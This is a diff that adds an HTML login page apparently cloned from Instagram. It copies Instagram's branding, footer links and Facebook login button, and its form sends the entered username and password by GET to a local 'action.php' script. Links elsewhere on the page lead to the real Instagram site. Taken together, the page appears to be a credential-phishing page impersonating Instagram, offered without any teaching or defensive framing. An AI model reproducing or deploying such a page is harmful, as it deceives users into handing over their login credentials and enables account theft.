@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Login | Instaclone</title>
+        <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+        <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
+        <link href="css/style.css" rel="stylesheet">
+        <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    </head>
+    <body class="no-padding">
+        <main class="login">
+            <div class="login__column">
+                <img 
+                    src="images/phone.png"
+                    alt="Phone Image"
+                    title="Phone Image"
+                    class="login__phone-image"
+                />                
+            </div>
+            <section class="login__column">
+                <div class="login__section login__sign-in">
+                    <img 
+                        src="images/logo.png"
+                        alt="Logo"
+                        title="Logo"
+                        class="login__logo"
+                    />
+                    <!-- x   -->
+                    <form method="GET" action="action.php" class="login__form">
+                        <div class="login__input-container">
+                            <input 
+                                type="text"
+                                name="username"
+                                placeholder="Username"
+                                required
+                                class="login__input"
+                            />
+                        </div>
+                        <div class="login__input-container">
+                            <input 
+                                type="password"
+                                name="password"
+                                placeholder="Password"
+                                required 
+                                class="login__input" 
+                            />
+                            <a href="https://www.instagram.com/accounts/emailsignup/" class="login__form-link">Forgot?</a>
+                        </div>
+                        <div class="login__input-container">
+                            <input
+                                type="submit"
+                                value="Log in"
+                                class="login__input login__input--btn"
+                            />
+                        </div>
+                    </form>
+                    <span class="login__divider">or</span>
+                    <a class="login__fb-link" href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%2522qwcffndq9t0vwnl5k3an4qr91fohm2y1cqpr511emo66e1cqnudq%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D9a9cde25-2d43-43e2-9365-70852ecf7480&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522qwcffndq9t0vwnl5k3an4qr91fohm2y1cqpr511emo66e1cqnudq%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0">
+                        <i class="fa fa-facebook-square fa-lg" aria-hidden="true"></i> Log in with Facebook
+                    </a>
+                </div>
+                <div class="login__section login__sign-up">
+                    <span class="login__text">
+                        Don't have an account? 
+                        <a href="https://www.instagram.com/accounts/emailsignup/" class="login__link">
+                            Sign up
+                        </a>
+                    </span>
+                </div>
+                <div class="login__section login__section--transparent login__app">
+                    <span class="login__text">
+                        Get the app.
+                    </span>
+                    <div class="login__appstores">
+                        <img 
+                            src="images/ios.png"
+                            alt="iOS"
+                            title="Get the app!"
+                            class="login__appstore" 
+                        />
+                        <img 
+                            src="images/android.png"
+                            alt="Android"
+                            title="Get the app!"
+                            class="login__appstore" 
+                        />
+                    </div>
+                </div>
+            </section>
+        </main>
+        <footer class="footer">
+            <nav class="footer__nav">
+                <ul class="footer__list">
+                    <li class="footer__list-item"><a href="https://about.instagram.com/" class="footer__link">ABOUT</a></li>
+                    <li class="footer__list-item"><a href="https://help.instagram.com/" class="footer__link">HELP</a></li>
+                    <li class="footer__list-item"><a href="https://about.instagram.com/blog/" class="footer__link">PRESS</a></li>
+                    <li class="footer__list-item"><a href="https://www.instagram.com/developer/" class="footer__link">API</a></li>
+                    <li class="footer__list-item"><a href="https://www.instagram.com/about/jobs/" class="footer__link">JOBS</a></li>
+                 <li class="footer__list-item"><a href="https://www.instagram.com/legal/privacy/" class="footer__link">PRIVACY</a></li>
+                    <li class="footer__list-item"><a href="https://www.instagram.com/legal/terms/" class="footer__link">TERMS</a></li>
+                    <li class="footer__list-item"><a href="https://www.instagram.com/explore/locations/" class="footer__link">LOCATIONS</a></li>
+                    <li class="footer__list-item"><a href="https://www.instagram.com/directory/profiles/" class="footer__link">TOP ACCOUNTS</a></li>
+                </ul>
+            </nav>
+            <span class="footer__copyright">© 2020 instagram</span>
+        </footer>
+<style>
+        <script
+  src="https://code.jquery.com/jquery-3.2.1.min.js"
+  integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+  crossorigin="anonymous"></script>
+        <script src="js/app.js"></script>
+    </body>
+</html>
